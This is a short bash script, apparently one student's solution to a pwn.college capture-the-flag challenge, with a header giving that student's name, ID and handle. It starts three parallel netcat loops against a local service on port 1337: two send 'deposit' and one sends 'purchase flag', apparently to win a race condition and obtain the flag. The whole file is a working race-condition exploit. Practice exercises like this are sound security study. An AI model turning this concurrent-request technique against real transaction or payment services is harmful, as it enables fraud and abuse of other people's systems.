#!/usr/bin/bash
# UID = 119362914
# Name = Sparsh Mehta
# PWNCLG = hutgrabber

for i in $(seq 1 1337); do
	echo "deposit" | nc localhost 1337
done &

for i in $(seq 1 1337); do
	echo "deposit" | nc localhost 1337
done &

for i in $(seq 1 1337); do
	echo "purchase flag" | nc localhost 1337
done &
